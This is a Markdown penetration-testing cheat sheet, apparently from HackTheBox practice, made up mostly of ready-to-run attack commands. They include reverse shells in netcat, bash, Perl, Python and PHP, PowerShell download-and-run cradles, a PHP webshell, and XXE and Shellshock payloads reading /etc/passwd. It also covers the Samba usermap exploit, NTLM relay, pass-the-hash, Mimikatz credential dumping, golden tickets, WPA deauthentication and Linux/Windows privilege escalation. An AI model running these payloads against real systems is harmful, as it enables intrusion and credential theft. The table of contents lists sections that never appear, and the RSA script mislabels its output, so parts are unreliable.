# Table of contents

1. [Misc](#Misc)
2. [Port Scanning](#port-scanning)
3. [Brute Forcing](#brute-forcing)
4. [Cracking](#cracking)
5. [Active Directory Initial Attack Vectors](#Active-Directory-Initial-Attack-Vectors)
6. [Active Directory Enumeration](#active-directory-enumeration)
7. [Active Directory Post-Compromise Attacks](#active-directory-post-compromise-attacks)
8. [Web Application Enumeration](#web-application-enumeration)
9. [XML External Entities (XXE)](#xml-external-entities-(xxe))
10. [Cross Site Scripting (XSS)](#cross-site-scripting-(xss))
11. [Wifi Hacking](#wifi-hacking)
12. [Windows Privilege Escalation](#windows-privilege-escalation)
13. [Linux Privilege Escalation](#linux-privilege-escalation)
14. [SMTP](#smtp)
15. [DNS](#dns)
16. [SSH](#SSH)
17. [Word Press](#word-press)
18. [Reverse Shells](#reverse-shells)
19. [RSA](#rsa)
20. [SSL](#ssl)
21. [Shell Shock](#shell-shock)
22. [SMB](#smb)
23. [Reverse Engineering](#Reverse-Engineering)
24. [SQLInjection](#SQLInjection)
25. [Wireshark](#Wireshark)
26. [OSINT](#OSINT) 
28. [WebDAV](#WebDAV)
29. [PowerShell](#PowerShell)
30. [Oracle](#Oracle)
31. [Memory Analysis](#Memory-Analysis)
32. [Upload Bypass](#Upload-Bypass)
33. [Local File Inclusion](#Local-File-Inclusion)
34. [Log Poisoning](#Log-Poisoning)
35. [SNMP](#SNMP)
36. [Buffer Overflow](#Buffer-Overflow)

<sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>

# Misc

## create password list
* create text file with keywords
```bash
January 
February
March
April
May
June
July
August
September
October
November
December
Autumn
Spring
Fall
Summer
Winter
Password
Forest
Secret
```
```bash
for i in $(cat pwlist.txt); do echo $i; echo ${i}\!; echo ${i}2020; echo ${i}2019; done > tmp
mv tmp pwlist.txt

hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/leetspeak.rule -r /usr/share/hashcat/rules/toggles1.rule   > tmp
mv tmp pwlist.txt
```

## Automated IP Lookup
```bash
~/mfu# curl -s https://api.greynoise.io/v3/community/8.8.8.8 | python3 -m json.tool
{
    "ip": "8.8.8.8",
    "noise": false,
    "riot": true,
    "classification": "benign",
    "name": "Google Public DNS",
    "link": "https://viz.greynoise.io/riot/8.8.8.8",
    "last_seen": "2021-03-30",
    "message": "Success"
}
```

## PHP Filter
* to avoid scripts to be executed which you can access via parameter use:
```
GET /browse.php?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
```

## System Images
### Transfer compressed image via netcat
```
dd if=/dev/dm-0 | gzip - | nc 10.10.14.23 3142
```
### Convert to raw
```
qemu-img convert vm.qcow2 vm.raw
```
### Get info
```
mmls vm.raw
sudo fdisk -l vm.raw
fsstat -o 2048 vm.raw
sudo sfdisk -d vm.raw
```
### Get offset and sizelimit
* run sfdisk -d vm.raw
* sample output:
```
[sudo] password for kali: 
label: dos
label-id: 0x50811ac7
device: vm.raw
unit: sectors
sector-size: 512

vm.raw1 : start=        2048, size=       36864, type=83, bootable
vm.raw2 : start=       38912, size=      233472, type=83
```
* calculate offset and sizelimit
```
echo $((2048 * 512)) $((36864 * 512))
```
* mount image
```
sudo mount -o ro,offset=1048576,sizelimit=18874368 vm.raw /media/image
```
* boot image using QEMU (Quick Emulator)
```
# install dependencies
apt install qemu qemu-kvm
# boot
qemu-system-x86_64 vm.raw -m 1024 # -m for specifying RAM
```

## RDP Tool for Linux
* Remmina (apt install remmina)

## Log commands into file
```
screen cmd.log
exit
```

## Fix VPN routing issue (HTB)

```
fixvpn='sudo route del -net 10.10.10.0 gw 10.10.14.1 netmask 255.255.255.0 dev tun0'
```

## SimpleHTTPServer

```
python -m SimpleHTTPServer
```

```
python3 -m http.server 8080
```

## rlwrap
* use rlwrap to use arrow keys within reverse shell
```
rlwrap nc -lvnp 3141
```

## Upgrade Reverse Shell

1. ``` Ctrl+z``` to background session
2. ``` stty raw -echo```
3. ```fg``` to foreground session again

## Password List

:information_source: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

## very simple PHP webshell
```
<?php system($_GET["cmd]);?>
```

# Port Scanning

``` bash
nmap -sC -sV -oA outfile 192.168.1.0/24
nmap -Pn -n -p21,22,139,445,3632 --script vuln -sV -oN nmap/vuln_scan 10.10.10.3
nmap -T4 -Pn -p- <TARGET> -o tmp.nmap > /dev/null
nmap -sC -sV -o portscan.nmap -p $(cat tmp.nmap | grep open | cut -d\t -f1 | sed 's/\///g' | paste -sd, ) <TARGET> > /dev/null
for i in `nmap -T4 -p- 192.168.67.133 |grep open |cut -f 1 -d /` ; do nmap -T4 -p$i -A 192.168.67.133; done

nmap -sU 10.10.10.116 # UDP
```


# Brute Forcing
## hydra

```
hydra -l admin -P <PASSLIST> <IP> http-post-form "/index.php:username=^USER^&password=^PASS^&login=login:Login failed" -V
```

Where first field (delimited by :)  is URL. Second field contains parameters and third contains a string within the response from webpage which indicates that the login failed.
## wfuzz

``` bash
wfuzz -u http://10.10.10.157/centreon/api/index.php?action=authenticate -d ’username=admin&password=FUZZ’ -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt --hc 403
wfuzz --hc 404 -c -z file,big.txt http://10.10.26.165/site-log.php\?date=FUZZ
```

# Cracking
## Example MD5 Hash

```
hashcat --example-hashes | grep MD5 -C 4
hashcat -m 500 hash rockyou.txt
```

```
hashcat -m 500 -a0 --force 'tmp' '/usr/share/wordlists/rockyou.txt'	
```

# Active Directory Initial Attack Vectors

## Capturing NTLM net-Hashes with Responder

:information_source: Default configuration in windows is always fall back to LLMNR if DNS resolving fails. LLMNR broadcasts its request to the whole network.

```sequence
Victim->DNS Server: Who is "fileservrr"
DNS Server->Victim: I don't know
Victim->Network: Anyone knows who "fileservrr" is?
Attacker->Victim: Yes, this is me
Victim->Attacker: I would like to log in
Attacker->Victim: OK, encrypt this challenge with your password hash
Victim->Attacker: Sends encrypted challenge
Attacker->Victim: Sorry, something went wrong
```

``` bash
responder -I eth0 -rdwv

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 192.168.92.129
[SMB] NTLMv2-SSP Username : WHITEROSE\ealderson
[SMB] NTLMv2-SSP Hash     : ealderson::WHITEROSE:af77856ba3332f51:B81BF48A67FE909F054D588DF1345C6A:0101000000000000C0653150DE09D2012BC03559A3DFA755000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000F279BA7D9D36AB76937A31505A3A023E63ECAF17A4F311B0E248705A3CB09B9A0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00390032002E003100330033000000000000000000
```

## Crack NTLMv2 Net-Hashes with hashcat

1. Get module number of NTLM hash with 

   ``` bash
   hashcat --example-hashes | grep NTLM -C 4
   ```

2. Crack Hash

   ``` bash
   hashcat -m 5600 hashes.txt rockyou.txt 
   ```

## SMB Relay Attack

:warning: This does not work if SMB Signing is required. 

:warning: The relayed user needs to be a local administrator on target machine to dump the SAM hashes.

Disable SMB in ```/etc/responder/Responder.conf``` and run:

``` bash
responder -I eth0 -rdwv
```

Open a second terminal and run:

```
ntlmrelayx.py -tf targets.txt -smb2support
```

## ldap enumeration
```bash
# get base domain name with nmap
nmap -n -sV --script "ldap* and not brute" 10.10.10.161
nmap -p 389 --script ldap-rootdse -Pn 10.10.10.161
nmap -p 389 --script ldap-search -Pn 10.10.10.161

# get information
ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "DC=htb,DC=local"  
```

## password spraying
* get the domain password policy first to check lockout policy
```bash
crackmapexec smb 10.10.10.161 --pass-pol
crackmapexec smb 10.10.10.161 -u userlist.txt -p pwlist.txt
```

## Shell Access with Credentials

:information_source: Start with smbexec.py and wmiexec.py due to psexec.py is more noisy and may trigger windows defender.
:information_source: If winrm port is open, see [evil-winrm](https://github.com/Hackplayers/evil-winrm)

``` bash
psexec.py whiterose.local/ealderson:Password!@192.168.92.129
```

* https://github.com/Hackplayers/evil-winrm


## IPv6 Attacks

:information_source: ​Only possible if IPv6 is enabled and no DNS Server is defined for IPv6. In this case we may get NTLM net-Hashes and can relay those to authenticate (see SMB Relay Attack). Details: 

[Combining NTLM Relaying and Kerberos Delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)

[mitm6 - compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)

:information_source: Make sure mitm6 is installed. If not, install it with: ``` sudo pip3 install mitm6 ```

``` bash
mitm6 -d whiterose.local
```

Open a second terminal and run:

```
ntlmrelayx.py -6 -t ldaps://192.168.92.130 -wh fakewpad.whiterose.local -l outfile
```

:information_source: ``` --delegate-access ``` 

# Active Directory Enumeration

## PowerView

:information_source: [sourcecode](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

:information_source: [cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

1. Bypass execution policy

```
powershell -ep bypass
```

2. Use PowerView

```
. .\PowerView.ps1
```

3. Start enumerating. Examples:

```
Get-NetDomain
```

```
Get-NetDomainControllers
```

```
Get-DomainPolicy
```

```
{Get-DomainPolicy}."system access"
```

```
Get-NetUser
```

```
Get-NetUser | select cn
```

```
Get-NetUser | select samaccountname
```

```
Get-UserProperty
```

```
Get-UserProperty -Properties pwdlastset
```

```
Get-NetComputer -FullData
```
```
Get-NetGroup
```

```
Get-NetGroupMember -GroupName "Domain Admin"
```

```
Invoke-ShareFinder
```

```
Get-NetGPO | select displayname, whenchanged
```

:information_source: Detect possible honey accounts with:

```
Get-UserProperty -Properties logoncount
```

## Bloodhound

:information_source: [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1) 				

:information_source: [Data-Collector](https://github.com/BloodHoundAD/BloodHound/wiki/Data-Collector) 

On host run:

```
powershell -ep bypass
```

```
. .\SharpHound.ps1
```

```
Invoke-Bloodhound -CollectionMethod All -Domain WHITEROSE.local -ZipFileName file.zip 
```

You can also use the .exe
```
.\SharpHound.exe -c all
```

Transfer the zip file to kali instance and load it into bloodhound to visualize.

:information_source: Install bloodhound using apt or download git repository
:information_source: bloodhound depends on neo4j so make sure it is installed
:information_source: good starting point are prebuild queries. see 'shortest path to high value targets'

# Active Directory Post-Compromise Attacks

## Pass The Password

:information_source: install crackmapexec using apt
:information_source: keep lockout policy in mind

You can spray credentials in an AD network using crackmapexec:

```
crackmapexec 192.168.92.0/24 -u ealderson -d WHITEROSE.local -p Password123
```

## Dumping Hashes With secretsdump.py

:information_source: secretsdump.py is part of the impacket toolkit

```
secretsdump.py whiterose/ealderson:Password123@192.168.92.131
```

## Pass The Hash

Use NTHASH (LMHASH:NTHASH)

```
crackmapexec 192.168.92.0/24 -u "Elliot Alderson" -H 64f12cdda88057e06a81b54e73b949b --local
```

## Shell Access Whith NTLM Hash

```
psexec.py -u "Elliot Alderson":@192.168.92.131 -hashes <lmhash:nthash>
```

## Token Impersonation

Get a meterpreter session (e.g. smb/psexec).

```
meterpreter> load incognito
meterpreter> list tokens
meterpreter> impersonate_token marvel\\administrator
```

## Kerberoasting

:information_source: GetUserSPNs.py is part of the impacket toolkit

### Kerberos in a nutshell

```sequence
User->Domain Controller: 1. Request TGT, Provide NTLM hash
Domain Controller->User: 2. Receive TGT enc. w. krbtgt hash
User->Domain Controller: 3. Request TGS for Server (Presents TGT)
Domain Controller->User: 4. Receive TGS enc. w. servers account hash
User->Application Server: 5. Presents TGS for service enc. w. servers account
Application Server->Domain Controller: (opt.) PAC Validation request
Domain Controller->Application Server: (opt.) PAC Validation response
```



### Approach: Crack the servers account hash

```
GetUserSPNs.py whiterose.local/ealderson:Password123 -dc-ip 192.168.92.130 -request
```

## cPassword / Group Policy Preferences (GPP) Attacks

:information_source: GPP's allowed admins to create policies using embedded credentials. These credentials were encrypted and placed in a 'cPassword'. The key was accidentally released. Patched with MS14-025 but does not prevent the previous uses. If the policy was set before this was patched. [Blogpost](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)

:information_source: Check if vulnerable with metasploit using smb_enum_gpp.

:information_source: You can test this attack using the retired machine 'Active' on HackTheBox

Get Groups.xml from SYSVOL or \Replication share and check for cPassword.

```
gpp-decrypt <cPassword-Hash>
```

## Mimikatz

[Github Page](https://github.com/gentilkiwi/mimikatz)

:information_source: Tool used to view and steal credentials, generate kerberos tickets, leverage attacks and dump credentials stored in memory. Not working every time due to cat and mouse game between developers and windows.

### Dump Hashes 

Run mimikatz on DC and run the following commands to dump hashes.

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam 
mimikatz # lsadump::sam /patch
mimikatz # lsadump::lsa /patch
```

### Golden Ticket Attack

```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
```

Copy S-ID of the domain and NTLM hash of TGT-Account.

```
mimikatz # kerberos::golden /User:Administrator /domain:whiterose.local /sid:S-1-5-21-301242389-3840584950-2384549833 /krbtgt:64f12cdda88057e06a81b54e73b949b /id:500 /ptt
mimikatz # misc::cmd
```

# Web Application Enumeration
## Burpsuite
* Target > Site map > right click on host > Spider this host 

## gobuster
```
gobuster dir -k -u https://10.10.10.7/ -w usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt	
```

Install golang and add the following two lines to ~/.bashrc (or ~/.profiles)

```
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin		
```

## [Assetfinder](https://github.com/tomnomnom/assetfinder)

```
go get -u github.com/tomnomnom/assetfinder
```

:information_source: also see [amass](https://github.com/OWASP/Amass)

## [Httprobe](https://github.com/tomnomnom/httprobe) (find alive domains)

```
go get -u github.com/tomnomnom/httprobe
```

## [GoWitness](https://github.com/sensepost/gowitness) (Screenshotting Websites)

```
go get -u github.com/sensepost/gowitness
```

# XML External Entities (XXE)

Basic idea: upload an xml to test if it gets parsed and then abusing the doctype definition (DTD).

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

# Cross Site Scripting (XSS)

:information_source: https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)

:information_source: https://www.scip.ch/en/?labs.20171214 

:information_source: https://xss-game.appspot.com/

:information_source: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

:information_source: https://github.com/payloadbox/xss-payload-list

:information_source: https://tryhackme.com/room/learnowaspzap

# Wifi Hacking

## WPS Pin Recovery
```
reaver -i wlan0mon -b 9C:AD...(network-target-mac) -c 1 (channel 1) -f (fixed:one channel) -a -w(win7 register art) -v (verbose) -K 1 (Pixie-attack: hit common pins)
#if Pixie (-K 1 doesnt work, run -vv (very verbose))
```

## Capture WPA/WPA2 Handshake
```
ifconfig wlan0 down
macchanger -r wlan0
ifconfig wlan0 up
```
```
airmon-ng
airmon-ng check
airmon-ng check kill
airmon-ng start wlan0
```
```
airodump-ng wlan0mon [--bssid F0:7B.... where F0:7B.. is mac of "target-router"][--channel 11][--write Desktop/path/to/my/file]
```
```
aireplay-ng wlan0mon [--deauth 2000 (sending 2000 deauth packages)][-a F0:7B.. (-a: Accesspoint:Macadress of router)][-c F9:2D..(-c:Client: Macadress of target)]
#sending deauth packages to force a handshake
```

## Crack WPA/WPA2 Handshake

```
aircrack-ng Path/to/my/captureFile/with/handshake.cap -w /Path/to/my/password/list.txt
```

# Windows Privilege Escalation

## [Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

## System Enumeration
```
systeminfo
hostname
tasklist
wmic qfe
wmic logicaldisk get caption,description,providername
```

## User Enumeration
```
whoami
whoami /priv
whoami /groups
net user 
net user Administrator
net localgroup
net localgroup Administrators
```

## Network Enumeration
```
ipconfig
ipconfig /all
arp -a
route print
netstat -ano
```

## Password Hunting
```
findstr /si password *.txt *.ini *.config
```
## 

## AV and FW Enumeration
```
sc query windefend
sc queryex type= service # Show all services
netsh advfirewall firewall dump
firewall show state
netsh firewall show config
```

## Automated Enumeration Tools
### Download and run executable with simple bypass method (from cmd.exe)
```
echo IEX(New-Object System.Net.WebClient).DownloadString("http://10.10.14.23:8000/jaws-enum.ps1") | powershell -noprofile -
```
### Download File
```
IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.23:8000/nc.exe", "C:\test\nc.exe")
```

### Executables
* [winPEAS.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
* [Seatbelt.exe](https://github.com/GhostPack/Seatbelt)
* [Wason.exe](https://github.com/rasta-mouse/Watson)
* [SharpUp.exe](https://github.com/GhostPack/SharpUp)

### PowerShell
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) 
* [Sherlock.ps1](https://github.com/rasta-mouse/Sherlock)
* [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* [jaws-enum.ps1](https://github.com/411Hall/JAWS)

### Other
* [exploit suggester (metasploit)](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
* [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
 
### [windows-exploit-suggester.py (local)](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
this script uses python2 which can lead to issues. create virtualenv and make sure you are using xlrd version 1.2.0
```
virtualenv -p /usr/bin/python2.7 venv
source venv/bin/activate
pip install xlrd==1.2.0
./windows-exploit-suggester.py --database 2020-12-12-mssb.xls --systeminfo sysinfo.txt
```

## [Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

## Potato Attacks
* [Rotten Potato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
* [Juicy Potato](https://github.com/ohpe/juicy-potato)


# Linux Privilege Escalation
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
* https://payatu.com/guide-linux-privilege-escalation
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation
 
## Get Capabilities
```
/sbin/getcap -r / 2>/dev/null
```

## Sudo underflow bug (CVE-2019-14287)
```
sudo -u#-1 /bin/bash
```

## LinEnum
Download [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) and run it on victim's machine. 

## Setuid bits
* https://gtfobins.github.io/
``` 
# Find SUID files
find / -user root -perm -4000 2>/dev/null
# Set UID bit
chmod u+s /script
```

### Example (node@htb)
* User with higher privilege (tom) runs a scheduled task (/var/schedulder/app.js) which reads commands (cmd) from a mongo database (tasks) and executes them.
```
mark@node:~$ mongo -p -u mark scheduler # the scheduler script revealed authSource=scheduler
> db.tasks.insert( { "cmd" : "cp /bin/bash /tmp/manununu; chown tom:admin /tmp/manununu; chmod u+s /tmp/manununu; chmod g+s /tmp/manununu;" } )
> db.tasks.find()
{ "_id" : ObjectId("5f268f230bc897a5c9442b54"), "cmd" : "cp /bin/bash /tmp/manununu; chmod u+s /tmp/manununu;" }

mark@node:~$ ls -la /tmp/manununu
-rwsr-sr-x 1 tom tom 1037528 Aug  2 10:42 /tmp/manununu

mark@node:~$ /tmp/manununu -p # -p priviliged    Do not attempt to reset effective uid if it does not match uid.
manununu-4.3$ whoami
tom
```

### Example (bash)
``` 
find / -perm -u=s -type f 2>/dev/null
bash -p
```

## LXD
1. check if user is in lxd group by running ```id```
2. download and build build-alpinge using this [git repository](https://github.com/lxd-images/alpine-3-7-apache-php5-6)
3. initialize image inside a new container on victim machine
```
flynn@light-cycle:~$ lxc image list
To start your first container, try: lxc launch ubuntu:18.04

+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| Alpine | a569b9af4e85 | no     | alpine v3.12 (20201220_03:48) | x86_64 | 3.07MB | Dec 20, 2020 at 3:51am (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+

flynn@light-cycle:~$ lxc init Alpine test -c security.privileged=true
iflynn@ligt-cycle:~$ lxc config device add test testdev disk source=/ path=/mnt/root recursive=true
flynn@light-cycle:~$ lxc start test
flynn@light-cycle:~$ lxc exec test /bin/sh
~ # whoami
root
```



# SMTP
## Extract Mails from Server using Telnet (Authenticated, IMAP)
```
telnet <IP or Hostname> 143
a1 LOGIN <usename> <password>
a2 LIST '' '*'
a3 EXAMINE INBOX
a4 FETCH 1 BODY[]
a5 FETCH 2 BODY[]
```

# DNS
## DNS Recon

``` bash
dnsrecon -r 127.0.0.1/24 -n <IP of DNS Server>
```
### query dns server with nslookup
```
nslookup
# set dns server
> server 10.10.10.13                                                                                                                                                     
Default server: 10.10.10.13
Address: 10.10.10.13#53               
# lookup ip
> 10.10.10.13                        
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb
```

## Zone transfer
```
[16:18:50]-[kali@kali]-[~/hackthebox/boxes/cronos] » dig axfr cronos.htb @ns1.cronos.htb                                                                            10 ↵

; <<>> DiG 9.16.6-Debian <<>> axfr cronos.htb @ns1.cronos.htb
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 95 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Wed Dec 23 16:19:03 CET 2020
;; XFR size: 7 records (messages 1, bytes 203)

```


# SSH
## Crack Passphrase for given SSH-Key
* [John The Ripper](https://github.com/openwall/john)
* [ssh2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
```
python3 ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=<wordlist>
```

# Word Press
## wpscan
```
wpscan --url https://brainfuck.htb --disable-tls-checks
```

# Reverse Shells
## Netcat
```
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f # in case wrong version of nc is installed
```

## Bash
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

## Perl

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```
#!/usr/bin/perl -w
use Socket;
$i="10.10.14.41";
$p=4443;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("/bin/sh -i");
};
```

## Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

 
## Using msfvenom 

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f raw > shell.php
```

## Windows
```
powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))

c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1')
```


# RSA
## Given: q, p, and e values for an RSA key, along with an encrypted message
The following script can be found [here](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e). It is using the extended eucledian algorithm for calculating the modulus inverse.

``` python
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 1090660992520643446103273789680343
    q = 1162435056374824133712043309728653
    e = 65537
    ct = 299604539773691895576847697095098784338054746292313044353582078965

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()
```

# SSL
## Check if Private Key matches Certificate

```
openssl x509 -noout in serct.crt | md5sum
```

```
openssl rsa -noout in key.key | md5sum	
```

## View CSR Entries
```
openssl req -text -noout -verify -in csr.csr
```

## View Certificate Entries
```
openssl x509 -text -noout -in crt.crt 
```

## Generate new Private Key and Certificate Signing Request (CSR)

```
openssl req -out CSR.csr -new -newkey rsa:4096 -nodes -keyout key.key
```

## Sign a CSR
```
openssl x509 -req -sha256 -days 1000 -in server.csr -signkey server.key -out server.pem
```

## Generate a self-signed Certificate

```
openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:4096 -keyout key.key -out crt.crt
```

## Verify (python3 https server)
First create .pem file with .crt and .key
```
cat crt.crt key.key > pem.pem
```
Then run the following script
```python3
#!/usr/bin/python3

import http.server
import ssl

httpd = http.server.HTTPServer(('localhost',4443),
        http.server.SimpleHTTPRequestHandler)

httpd.socket = ssl.wrap_socket(httpd.socket, certfile='pem.pem', server_side=True)
httpd.serve_forever()
```

# Shell Shock
## CVE-2014-6271
```
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```

## Example from HTB (Shocker)

### Request
```
GET /cgi-bin/user.sh HTTP/1.1

Host: 10.10.10.56

User-Agent: () { :;};echo -e "\r\n$(/bin/cat /etc/passwd)"

Connection: close

```

### Response
```
HTTP/1.1 200 OK

Date: Tue, 06 Oct 2020 19:40:22 GMT

Server: Apache/2.4.18 (Ubuntu)

Connection: close

Content-Type: text/x-sh

Content-Length: 1687


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
.
.
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash

Content-Type: text/plain

Just an uptime test script

 15:40:23 up 15 min,  0 users,  load average: 0.00, 0.00, 0.00

```


# SMB
## /etc/samba/smb.conf
Add the following to the global section 
```
client min protocol = CORE
client max protocol = SMB3
```

## List shares
```
smbclient -L \\10.10.10.3\
smbmap -H 10.10.10.3
```

## Connect to share
```
smbclient \\\\10.10.10.3\\sharename
smbclient //10.10.10.3/tmp # different syntax 
smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1' # for using insecure protocol if negotiation failed
```

## CVE-2007-2447 (smb usermap script)
### Example from Lame (HTB)
```
smbclient //10.10.10.3/tmp
smb: \> logon "/=`nohup mkfifo /tmp/manununu; nc 10.10.14.41 2222 0</tmp/manununu | /bin/sh >/tmp/manununu 2>&1; rm /tmp/manununu`"
```

# Reverse Engineering

## gdb
Example: Binary which prompting for a password. 
1. gdb --args ./holly.bin asdf
2. disassemble main
3. search for str -> copy address and set breakpoint: # most likely a strcmp function or smth. similar
4. b *0x0000000000400d9d 
5. info registers
6. (gdb) x/s $rsi
7. 0x7fffffffdeb0: "holly-likes-alotta-crackas!"
8. (gdb) x/s $rdi
9. 0x7fffffffe33a: "asdf"

There is also a nice gdb plugin called [peda](https://github.com/longld/peda)

## .NET assembly decompiler
* [ILSpy](https://github.com/icsharpcode/ILSpy)
* [dotPeek](https://www.jetbrains.com/decompiler/)

## radare2 (r2)
```
r2 -d ./file

# analyze the program
aa

# list all functions
afl
afl | grep main

# print disassembly function
pdf @main

# Data Types
Initial Data Type | Suffix | Size (bytes)
-----------------------------------------
Byte	          |   b    |   1
Word              |   w    |   2
Double Word       |   l    |   4
Quad              |   q    |   8
Single Precision  |   s    |   8
Double Precision  |   l    |   4

# set breakpoint
db 0x00400b55

# ensure breakpoint is set correct
pdf @main

# run program until hit breakpoint
dc

# print memory address
px @memory-address
px rbp-0xc

# execute next instruction
ds

# see value of registers
dr

# reload program
ood
```

## Malware Analysis
* [REMNux](https://remnux.org/)

# SQLInjection
## Resources
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
* https://github.com/payloadbox/sql-injection-payload-list

## sqlmap
* example commands
```
sqlmap --url http://10.10.128.77:8000/sqlpanel --tables --columns
sqlmap -r sqlpanel.request --dbms=sqlite --dump-all --tamper=space2comment
```
* capture sqlpane.request with burpsuite first
* --tamper=space2comment for trying to bypass WAF


# Wireshark
## Good to Know
* File > Export Objects
## Filters
* ip.src ==
* ip.dst ==
* tcp.port == 22
* http.request.method == GET


# OSINT
* https://namechk.com/
* https://whatsmyname.app/,
* https://namecheckup.com/
* https://github.com/WebBreacher/WhatsMyName
* https://github.com/sherlock-project/sherlock

## Search for breaches
